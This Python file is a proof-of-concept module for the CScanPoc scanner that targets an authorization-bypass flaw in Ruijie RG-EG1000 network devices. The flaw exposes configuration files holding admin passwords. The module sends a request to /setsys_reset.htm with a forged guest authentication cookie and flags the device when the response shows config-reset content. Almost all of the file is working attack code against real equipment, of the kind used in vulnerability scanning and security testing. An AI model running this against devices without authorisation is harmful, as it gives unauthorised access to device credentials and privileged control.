# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'Ruijie_0004'  # 平台漏洞编号，留空
    name = '锐捷网络 RG-EG1000 非法访问敏感信息'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-11-25'  # 漏洞公布时间
    desc = '''
        锐捷网络2015年新品RG-EG1000系列产品存在授权绕过非法访问敏感信息缺陷。
        config配置文件(包括管理密码获取设备特权模式)
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=082472'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '锐捷网络'  # 漏洞应用名称
    product_version = 'RG-EG1000'  # 漏洞应用版本


def base64(string):
    import base64
    return base64.b64encode(string)


class Poc(ABPoc):
    poc_id = 'b837f772-0710-4e59-8636-46b29a8550fd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Referer   :  http://www.wooyun.org/bugs/wooyun-2010-082472
            hh = hackhttp.hackhttp()
            payload = '/setsys_reset.htm'
            cookie = 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; hardtype=NBR1300G; web-coding=gb2312; currentURL=index'

            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url, cookie=cookie)
            if code == 200 and 'remove-file config.text' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
